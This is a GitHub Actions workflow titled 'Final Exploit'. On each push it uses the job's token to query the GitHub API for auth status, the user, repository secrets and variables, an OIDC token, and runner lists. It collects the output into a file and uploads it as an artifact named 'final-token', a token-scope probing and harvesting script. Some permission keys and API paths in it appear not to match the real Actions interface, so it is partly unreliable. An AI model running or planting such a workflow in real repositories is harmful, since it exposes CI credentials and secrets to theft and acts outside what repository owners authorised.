name: Final Exploit
on:
  push:
    branches: [master]
permissions:
  id-token: write
  contents: read
  actions: read
  checks: read
  secrets: read
  packages: read
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    env:
      GH_TOKEN: ${{ github.token }}
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Full token scope
        continue-on-error: true
        run: |
          mkdir -p dist
          echo "=== GH AUTH ===" > dist/r.txt
          gh auth status 2>&1 >> dist/r.txt
          
          echo "=== USER ===" >> dist/r.txt
          gh api /user 2>&1 >> dist/r.txt
          
          echo "=== REPO ===" >> dist/r.txt
          gh api /repos/977812671/npm-install 2>&1 | head -20 >> dist/r.txt
          
          echo "=== SECRETS ===" >> dist/r.txt
          gh api /repos/977812671/npm-install/actions/secrets 2>&1 >> dist/r.txt
          
          echo "=== VARIABLES ===" >> dist/r.txt
          gh api /repos/977812671/npm-install/actions/variables 2>&1 >> dist/r.txt
          
          echo "=== OIDC TOKEN ===" >> dist/r.txt
          gh api /repos/977812671/npm-install/actions/id-token 2>&1 >> dist/r.txt
          
          echo "=== RUNNER LIST ===" >> dist/r.txt
          gh api /repos/977812671/npm-install/actions/runners 2>&1 >> dist/r.txt
          
          echo "=== ORG RUNNERS ===" >> dist/r.txt
          gh api /orgs/977812671/actions/runners 2>&1 | head -20 >> dist/r.txt

      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: final-token
          path: dist/
